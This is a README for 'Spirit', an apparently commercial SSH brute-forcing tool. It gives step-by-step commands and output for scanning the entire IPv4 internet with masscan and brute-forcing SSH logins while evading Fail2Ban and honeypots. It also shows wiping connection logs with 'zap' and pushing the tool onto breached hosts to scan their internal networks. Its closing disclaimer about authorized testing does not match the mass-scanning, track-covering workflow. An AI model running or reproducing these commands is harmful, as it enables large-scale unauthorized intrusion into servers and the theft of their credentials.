# Spirit - Network Pentest Tools
> We believe in making the internet a safe environment where security is taken seriously as a priority and forcing out of the market bad actors like the admins allowing password authentication over such a critical cog of our infrastructure. Spirit is designed to root out these weeds (pun intended).
<p align="left">  <a href="https://t.me/spiritNPT"><img width="160" height="50" src="https://i.imgur.com/N7AK7XY.png"></a></p>

### [Download the latest Spirit release](https://github.com/theaog/spirit/releases)

```bash
$ wget https://github.com/theaog/spirit/raw/refs/heads/master/bin/spirit.tgz
$ curl -OL https://github.com/theaog/spirit/raw/refs/heads/master/bin/spirit.tgz

$ tar xvf spirit.tgz
$ ./spirit autobrute --ports 22
```

> [`$ ./spirit --help`](./HELP) shows you all the included tools. \
Most commands have subcommands `./spirit <command> --help`

## Autobrute with zones
```bash
# Create zone.lst containing IP addresses in CIDR notation
$ cat >zone.lst<< EOF
192.168.0.0/16
172.16.0.0/12
10.0.0.0/8
EOF

# autobrute will generate collision-free(non-repeating) random ports
# scan and brute them over and over -- forever!
./spirit autobrute
```

## Local network demo
[![asciicast](https://asciinema.org/a/645079.svg)](https://asciinema.org/a/645079?autoplay=true&loop=true)

## Support
- [GitHub Issue](https://github.com/theaog/spirit/issues/new)
- [Telegram](https://t.me/spiritNPT)

## Upgrade Spirit automatically
```bash
./spirit upgrade
Upgrading 87% [========================>     ] (5.9/5.9 MB, 49.652 MB/s)
```

## Spirit Brute|Banner vs Other...

### Spirit Banner 
- Stealthy, sends the least amount of TCP packets in order to retrieve the SSH version then breaks the connections without doing a Login
- Proper connection handling and timeout, doesn't leave dead connections open wasting file descriptors
- Fast, very fast and accurate

### Spirit Brute
- Custom SSH lib allows interacting with more SSH versions, ciphers, algos and macs
- Automatically removes unreachable IPs from the bruting cycle, less dull work = faster work
- Automatically adjusts the number of threads based on remaining hosts
- Tries to connect using Key files rather than just passwords
- Detects Honeypots and stops throwing passwords at them
- Tries 1 password per IP rather than throwing all passwords at the same host triggering Fail2Ban and protections of the sort
- Randomizes IPs to avoid saturating a network with packets from the same source
- Connects to multiple ports in the same hosts file
- Autossh allows connecting to all vulnerable hosts at once
- Allows submitting vulnerable hosts to your telegram channel
- Encrypts your passfile to safely use it on unsecured systems
- Excludes vuln found hosts, nologin hosts and honeypots from future scans: narrowing your search
- Generates statiscs and error logs

## Example usage for SSH brute flow TLDR;
```bash
# First scan your network or the internet (check disclaimer) to acquire a list of open ports.
$ masscan \
    --rate="50000" \
    --ports "22,222,2222,2212" 0.0.0.0/0 \
    --exclude 255.255.255.255 \
    -oG open.lst
Scanning 4294967295 hosts [4 ports/host]
# masscan will create an open.lst file in oG (output Greppable) format.

# Parse this open.lst to format the data, so that spirit can understand it.
$ ./spirit parse
INFO created h.lst in HOST:PORT format

# Optional: create a filter.lst file if you want to skip certain SSH versions.
# You can find common filters in this repo `filter.lst` file.
$ cat >filter.lst<< EOF
SSH-1.0
SSH-2.0-CISCO
SSH-2.0-Comware
EOF

# Grab SSH banners to make sure your target version is running on the host. NOTE: Makes a backup of h.lst to h.lst.bak
$ ./spirit banner
INFO backing up h.lst to h.lst.bak
SSH-2.0-OpenSSH_8.2p  13% [=>                  ] [11s:1m15s]
INFO created h.lst in HOST:PORT:BANNER format
head -n1 h.lst
100.100.100.100:2222:SSH-2.0-OpenSSH_6.6.1

# Add a password list, spirit will automatically load user:pass from a p.lst file.
# NOTE: if p.lst is not present, Spirit uses an internal passfile
$ cat > p.lst << EOF
user1:pass1
user1:pass2
user2:pass50
EOF

# Start bruting...
$ ./spirit brute
Spirit NPT (v1.30) upgrade by 24 Mar 24 00:00 UTC
HINT: Use `./spirit zap` to clean connection logs after you login via SSH
rlimit soft [1048576] hard [1048576]
INFO loaded b.lst with 26803 hosts
INFO loaded p.lst with 4881 logins
INFO randomized hosts
INFO block [true]
INFO timeout [5s]
INFO threads [1024]
[2478/4653]root:!1qwerty [77]found [33]blocked [1284]threads 20% [====>               ] [20s:1h13m36s]
Results
 |- found.ssh # Prepared SSH command
 |- found.login # Successful USER:PASS combinations
 |- found.lst # Syntax for autossh tool
 |- found.errors # SSH connection error statistics
Hosts[26803] Bruted[4000] Blocked[19803] Found[3000]

# If you want to go Faster try blocking bad hosts
./spirit brute --block=true

# Connect to all your found hosts automatically & run commands.
$ ./spirit autossh --command 'whoami && uptime'
# Upload spirit to all hosts and scan the LAN
$ ./spirit autossh --upload ./spirit --command '/tmp/spirit scan --lan'
```

## Spirit is Freemium
Scanning port 22 is unlimited for an hour, any other port requires a license which starts at $1/day/server.

## You can unlock Spirit's full functionality directly from the CLI by obtaining a license.
```bash
$ ./spirit buy

Payment-flow Support @ https://t.me/spiritNPT
Pricing model: $1 / Server / Day

┃ How many servers?> 1

┃ How many days?> 10

┃ Would you like 10% off using a referral code?
┃
┃   Yes     No
```

> if you encounter any issues w/ the payment, please reach out to us on [telegram](https://t.me/spiritNPT) or open an [issue](https://github.com/theaog/spirit/issues)

# Support our development

## Monero (XMR) thank you! (our favorite)
`895LJnKcfTv7NHf7SN1zz5UzhBRwwvdR8NYLvXNr54jJ3GXghBoyfBKLp2dL4GcYohQatRnigct8zgK6utkjjeBxVNsky1s`

![xmrqr](asset/xmrqr.png)

## Bitcoin (BTC) thank you too!
`bc1q7plm79dgllrhrjz772x4vjrtvu9yy03738psy5`

## Get Help & Support
Open a Github [issue](https://github.com/theaog/spirit/issues) and consider encrypting your message using this pub key [aog.gpg](asset/aog.gpg).

Don't forget to give us a Star!

> [!NOTE]
Spirit is clean software the only data it sends home is a server hash to verify the license.

# Disclaimer

> [!IMPORTANT]
> This tool should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it on your own systems and/or with the system owner's permission. Usage of any tools in this repository for attacking targets without prior mutual consent is illegal. It is the end user’s responsibility to obey all applicable local, state and federal laws. We assume no liability and are not responsible for any misuse or damage caused.
